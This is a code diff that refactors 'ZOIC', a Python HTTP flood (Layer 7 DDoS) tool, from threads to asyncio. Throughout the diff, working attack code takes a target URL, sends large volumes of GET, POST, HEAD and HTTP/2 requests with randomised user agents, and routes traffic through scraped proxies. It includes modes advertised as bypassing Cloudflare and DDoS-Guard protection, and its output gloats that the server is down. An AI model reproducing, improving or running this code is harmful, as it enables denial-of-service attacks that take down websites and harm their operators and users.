@@ -3,7 +3,6 @@ import sys
 import asyncio
 import aiohttp
 import aiosonic
-import threading
 import cloudscraper
 import random
 import time
@@ -86,6 +85,7 @@ google_agents = [
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ]
 
+
 scraper = cloudscraper.create_scraper()
 
 def logo():
@@ -120,8 +120,8 @@ def layer7():
                                                                                     
         ╔═════════════════════════════════════════════════╗
         ║                                                 ║
-        ║  - dgb   |  DDoS Guard Bypass with Request      ║
-        ║  - cfb   |  CloudFlare Bypass with Request      ║
+        ║  - dgb   |  DDoS Guard Bypass with request      ║ 
+        ║  - cfb   |  CloudFlare Bypass with request      ║
         ║  - get   |  GET Request Attack                  ║
         ║  - post  |  POST Request Attack                 ║
         ║  - head  |  HEAD Request Attack                 ║
@@ -136,29 +136,29 @@ def layer7():
 """))
             input(Colorate.Horizontal(Colors.blue_to_cyan, f"[+] Enter the continew..."))
 
-        elif select == "get" or select.lower() == "g":
+        if select == "get" or select.lower() == "g":
             async def send_request(session, url, retries=3):
                 headers = {
                     "User-Agent": random.choice(user_agent),
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - GET Request : {get_request} - Status : {response.status}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
-                        await asyncio.sleep(2)  
+                        await asyncio.sleep(2)
                         await send_request(session, url, retries - 1)
                 except aiohttp.ServerDisconnectedError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has disconnected by ZOIC !!"))
                     if retries > 0:
-                        await asyncio.sleep(2)  
+                        await asyncio.sleep(2)
                         await send_request(session, url, retries - 1)
                 except asyncio.TimeoutError:
-                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
-                        if retries > 0:
-                            await asyncio.sleep(2) 
-                            await send_request(session, url, retries - 1)
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
+                    if retries > 0:
+                        await asyncio.sleep(2)
+                        await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
                 connector = aiohttp.TCPConnector(ssl=False)
@@ -166,36 +166,29 @@ def layer7():
                     tasks = [send_request(session, url) for _ in range(get_request)]
                     await asyncio.gather(*tasks)
 
-            def send_thread(url, get_request):
-                while True:
-                    asyncio.run(send_requests(url, get_request))
-
-            def start_threads(url, num_threads, get_request):
-                threads = []
+            async def start_threads(url, num_threads, get_request):
+                tasks = []
                 for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, get_request))
-                    thread.daemon = True
-                    thread.start()
-                    threads.append(thread)
+                    task = asyncio.create_task(send_requests(url, get_request))
+                    tasks.append(task)
+                
+                await asyncio.gather(*tasks)
 
-                while True:
-                    time.sleep(0.1)
-
-            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
+            url = input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@URL]~$
 ╚══> """))
             
-            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
             
-            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
             
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
 
-            start_threads(url, num_threads, get_request)
+            asyncio.run(start_threads(url, num_threads, get_request))
 
 
         elif select == "post" or select.lower() == "p":
@@ -204,8 +197,8 @@ def layer7():
                     "User-Agent": random.choice(user_agent),
                 }
                 try:
-                    async with session.post(url, headers=headers, ) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - POST Request : {post_request} - Status : {response.status}"))
+                    async with session.post(url, headers=headers) as response:
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} POST Request : {post_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -217,46 +210,37 @@ def layer7():
                         await asyncio.sleep(2)  
                         await send_request(session, url, retries - 1)
                 except asyncio.TimeoutError:
-                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
-                        if retries > 0:
-                            await asyncio.sleep(2) 
-                            await send_request(session, url, retries - 1)
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
+                    if retries > 0:
+                        await asyncio.sleep(2) 
+                        await send_request(session, url, retries - 1)
 
             async def send_requests(url, post_request):
                 async with aiohttp.ClientSession() as session:
                     tasks = [send_request(session, url) for _ in range(post_request)]
                     await asyncio.gather(*tasks)
 
-            def send_thread(url, post_request):
-                while True:
-                    asyncio.run(send_requests(url, post_request))
-
-            def start_threads(url, num_threads, post_request):
-                threads = []
+            async def start_threads(url, num_threads, post_request):
+                tasks = []
                 for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, post_request))
-                    thread.daemon = True  
-                    thread.start()
-                    threads.append(thread)
+                    tasks.append(asyncio.create_task(send_requests(url, post_request)))
+                await asyncio.gather(*tasks)
 
-                while True:
-                    time.sleep(0.1)  
-
-            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
+            url = input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@URL]~$
 ╚══> """))
-            
-            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+
+            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
-            
-            post_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+
+            post_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
-            
-            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))    
 
-            start_threads(url, num_threads, post_request)
+            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
+
+            asyncio.run(start_threads(url, num_threads, post_request))
 
         elif select == "head" or select.lower() == "h":
             async def send_request(session, url, retries=3):
@@ -265,8 +249,8 @@ def layer7():
                 }
 
                 try:
-                    async with session.head(url, headers=headers,) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - HEAD Request : {head_request} - Status : {response.status}"))
+                    async with session.head(url, headers=headers) as response:
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HEAD Request : {head_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -278,119 +262,100 @@ def layer7():
                         await asyncio.sleep(2)  
                         await send_request(session, url, retries - 1)
                 except asyncio.TimeoutError:
-                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
-                        if retries > 0:
-                            await asyncio.sleep(2) 
-                            await send_request(session, url, retries - 1)
-            
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
+                    if retries > 0:
+                        await asyncio.sleep(2) 
+                        await send_request(session, url, retries - 1)
 
             async def send_requests(url, head_request):
                 async with aiohttp.ClientSession() as session:
                     tasks = [send_request(session, url) for _ in range(head_request)]
                     await asyncio.gather(*tasks)
 
-            def send_thread(url, head_request):
-                while True:
-                    asyncio.run(send_requests(url, head_request))
-
-            def start_threads(url, num_threads, head_request):
-                threads = []
+            async def start_threads(url, num_threads, head_request):
+                tasks = []
                 for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, head_request))
-                    thread.daemon = True  
-                    thread.start()
-                    threads.append(thread)
+                    tasks.append(asyncio.create_task(send_requests(url, head_request)))
+                await asyncio.gather(*tasks)
 
-                while True:
-                    time.sleep(0.1)
-
-            url = input(Colorate.Horizontal(Colors.green_to_blue,"""
+            url = input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@URL]~$
 ╚══> """))
-            
-            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+
+            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
-            
-            head_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+
+            head_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
-            
-            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))    
 
-            start_threads(url, num_threads, head_request)
+            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
+
+            asyncio.run(start_threads(url, num_threads, head_request))
 
 
         elif select == "http2" or select.lower() == "h2":
-                async def send_request(client, url, retries=3):
-                    headers = {
-                        "User-Agent": random.choice(user_agent),
-                    }
-                    try:
-                        response = await client.get(url, headers=headers)
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - HTTP2 Request : {get_request} - Status : {response.status_code}"))
-                    except aiosonic.exceptions.HttpParsingError:
-                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
-                        if retries > 0:
-                            await asyncio.sleep(2)
-                            await send_request(client, url, retries - 1)
-                    except asyncio.TimeoutError:
-                        print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
-                        if retries > 0:
-                            await asyncio.sleep(2)
-                            await send_request(client, url, retries - 1)
+            async def send_request(client, url, retries=3):
+                headers = {
+                    "User-Agent": random.choice(user_agent),
+                }
+                try:
+                    response = await client.get(url, headers=headers)
+                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HTTP2 Request : {get_request} Status : {response.status_code}"))
+                except aiosonic.exceptions.HttpParsingError:
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
+                    if retries > 0:
+                        await asyncio.sleep(2)
+                        await send_request(client, url, retries - 1)
+                except asyncio.TimeoutError:
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has TIMEOUT by ZOIC !!"))
+                    if retries > 0:
+                        await asyncio.sleep(2)
+                        await send_request(client, url, retries - 1)
 
-                async def send_requests(url, get_request):
-                    client = aiosonic.HTTPClient()
-                    tasks = [send_request(client, url) for _ in range(get_request)]
-                    await asyncio.gather(*tasks)
+            async def send_requests(url, get_request):
+                client = aiosonic.HTTPClient()
+                tasks = [send_request(client, url) for _ in range(get_request)]
+                await asyncio.gather(*tasks)
 
-                def send_thread(url, get_request):
-                    while True:
-                        asyncio.run(send_requests(url, get_request))
+            async def start_threads(url, num_threads, get_request):
+                tasks = []
+                for _ in range(num_threads):
+                    tasks.append(asyncio.create_task(send_requests(url, get_request)))
+                await asyncio.gather(*tasks)
 
-                def start_threads(url, num_threads, get_request):
-                    threads = []
-                    for _ in range(num_threads):
-                        thread = threading.Thread(target=send_thread, args=(url, get_request))
-                        thread.daemon = True
-                        thread.start()
-                        threads.append(thread)
-
-                    while True:
-                        time.sleep(0.1)
-
-                url = input(Colorate.Horizontal(Colors.green_to_blue,"""
+            url = input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@URL]~$
 ╚══> """))
 
-                num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+            num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
 
-                get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+            get_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
 
-                print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))  
+            print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
 
-                start_threads(url, num_threads, get_request)
+            asyncio.run(start_threads(url, num_threads, get_request))
 
         elif select == "pxreq" or select.lower() == "p":
             def proxy_hunter(url):
-                    proxies = []
-                    try:
-                        response = requests.get(url, timeout=5)
-                        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)  
-                        proxies.extend(proxy_list)
-                    except Exception as e:
-                        print(f"Error : {e}")
-                    return proxies
+                proxies = []
+                try:
+                    response = requests.get(url, timeout=5)
+                    proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)  
+                    proxies.extend(proxy_list)
+                except Exception as e:
+                    print(f"Error : {e}")
+                return proxies
 
             all_proxies = []
             for site in proxy_sites:
-                    proxies = proxy_hunter(site)
-                    all_proxies.extend(proxies)
+                proxies = proxy_hunter(site)
+                all_proxies.extend(proxies)
 
             async def send_request(session, url, proxy, retries=3):
                 headers = {
@@ -399,7 +364,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {proxy}:{url} - PROXY Request : {get_request} - Status : {response.status}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} PROXY Request : {get_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -423,40 +388,32 @@ def layer7():
                     ]
                     await asyncio.gather(*tasks)
 
-
-            def send_thread(url, proxy_list, get_request):
-                while True:
-                    asyncio.run(send_requests(url, proxy_list, get_request))
-
-            def start_threads(url, proxy_list, num_threads, get_request):
-                threads = []
-                for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, proxy_list, get_request))
-                    thread.daemon = True
-                    thread.start()
-                    threads.append(thread)
-
-
-                while True:
-                    time.sleep(0.1)  
+            async def start_threads(url, proxy_list, num_threads, get_request):
+                tasks = [
+                    asyncio.create_task(send_requests(url, proxy_list, get_request)) for _ in range(num_threads)
+                ]
+                await asyncio.gather(*tasks)
 
             url = input(Colorate.Horizontal(Colors.green_to_blue,"""
 ╔═══[root@URL]~$
 ╚══> """))
+
             num_threads = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
+
             get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
 ╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
 
+
             print(Colorate.Horizontal(Colors.green_to_blue,f"""
-╔═══[root@PROXY-TOTAL]~$
+╔═══[root@PROXY]~$
 ╚══> {len(all_proxies)}"""))
 
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
 
-            start_threads(url, all_proxies, num_threads, get_request)
+            asyncio.run(start_threads(url, all_proxies, num_threads, get_request))
 
         elif select == "dgb" or select.lower() == "d":
             def dgb_main(url):
@@ -473,7 +430,7 @@ def layer7():
 
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - Request : {get_request} - Status : {response.status}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -491,24 +448,15 @@ def layer7():
                         await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
-                async with aiohttp.ClientSession() as session:
-                    tasks = [send_request(session, url) for _ in range(get_request)]
+                    async with aiohttp.ClientSession() as session:
+                        tasks = [send_request(session, url) for _ in range(get_request)]
+                        await asyncio.gather(*tasks)
+
+            async def start_threads(url, num_threads, get_request):
+                    tasks = [
+                        asyncio.create_task(send_requests(url, get_request)) for _ in range(num_threads)
+                    ]
                     await asyncio.gather(*tasks)
-
-            def send_thread(url, get_request):
-                while True:
-                    asyncio.run(send_requests(url, get_request))
-
-            def start_threads(url, num_threads, get_request):
-                threads = []
-                for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, get_request))
-                    thread.daemon = True
-                    thread.start()
-                    threads.append(thread)
-
-                while True:
-                    time.sleep(0.1)
 
             url = input(Colorate.Horizontal(Colors.green_to_blue, """
 ╔═══[root@URL]~$
@@ -520,11 +468,10 @@ def layer7():
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
             get_request = int(input(Colorate.Horizontal(Colors.green_to_blue, """
-╔═══[root@GET-REQUEST(100~1000)]~$
+╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
-
-            start_threads(url, num_threads, get_request)
+            asyncio.run(start_threads(url, num_threads, get_request))
 
 
         elif select == "cfb" or select.lower() == "c":
@@ -534,7 +481,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:  
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} - Request : {get_request} - Status : {response.status}"))                                     
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))                                     
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -552,29 +499,19 @@ def layer7():
                         await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
-                session = aiohttp.ClientSession(
-                    connector=aiohttp.TCPConnector(ssl=False),
-                    headers=scraper.headers,  
-                    cookies=scraper.cookies   
-                )
-                tasks = [send_request(session, url) for _ in range(get_request)]
-                await asyncio.gather(*tasks)
-                await session.close()
+                    async with aiohttp.ClientSession(
+                        connector=aiohttp.TCPConnector(ssl=False),
+                        headers=scraper.headers,  
+                        cookies=scraper.cookies   
+                    ) as session:
+                        tasks = [send_request(session, url) for _ in range(get_request)]
+                        await asyncio.gather(*tasks)
 
-            def send_thread(url, get_request):
-                while True:
-                    asyncio.run(send_requests(url, get_request))
-
-            def start_threads(url, num_threads, get_request):
-                threads = []
-                for _ in range(num_threads):
-                    thread = threading.Thread(target=send_thread, args=(url, get_request))
-                    thread.daemon = True  
-                    thread.start()
-                    threads.append(thread)
-
-                while True:
-                    time.sleep(0.1)
+            async def start_threads(url, num_threads, get_request):
+                    tasks = [
+                        asyncio.create_task(send_requests(url, get_request)) for _ in range(num_threads)
+                    ]
+                    await asyncio.gather(*tasks)
 
             url = input(Colorate.Horizontal(Colors.green_to_blue,"""
 ╔═══[root@URL]~$
@@ -583,15 +520,14 @@ def layer7():
 ╔═══[root@THREAD(5~30)]~$
 ╚══> """)))
             get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
-╔═══[root@GET-REQUEST(100~1000)]~$
+╔═══[root@REQUEST(100~1000)]~$
 ╚══> """)))
             
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))
-
-            start_threads(url, num_threads, get_request)
+            asyncio.run(start_threads(url, num_threads, get_request))
+        
             
-    
-             
+
 
 
 if __name__ == "__main__":
